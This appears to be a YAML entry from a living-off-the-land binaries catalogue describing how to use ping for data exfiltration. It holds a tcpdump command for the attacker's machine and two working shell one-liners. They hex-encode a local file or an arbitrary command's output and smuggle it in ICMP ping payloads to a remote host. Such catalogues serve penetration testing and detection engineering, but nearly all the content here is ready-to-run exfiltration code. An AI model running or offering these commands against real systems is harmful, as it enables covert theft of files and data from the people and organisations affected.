---
functions:
  data-exfiltration:
    - description: |
        Capture ICMP packets embedded in ping requests.
        Run `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:'` on the attacker box to collect the data.             
        ⚠️ Increase the timeout flag based on the amount of data.                             
        ⚠️ Manual parsing or reconstruction is required.  
        
        Send local file content over ICMP using hex-encoded payloads.
      code: |
        hex=$(hexdump -v -e '1/1 "%02x"' $LFILE); i=0; while [ $i -lt ${#hex} ];
        do chunk="${hex:$i:16}"; ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
    - description: Send command output over ICMP using hex-encoded payloads.
      code: |
        hex=$(eval "$CMD" | hexdump -v -e '1/1 "%02x"'); i=0; while [ $i -lt ${#hex} ];
        do chunk="${hex:$i:16}"; ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
---
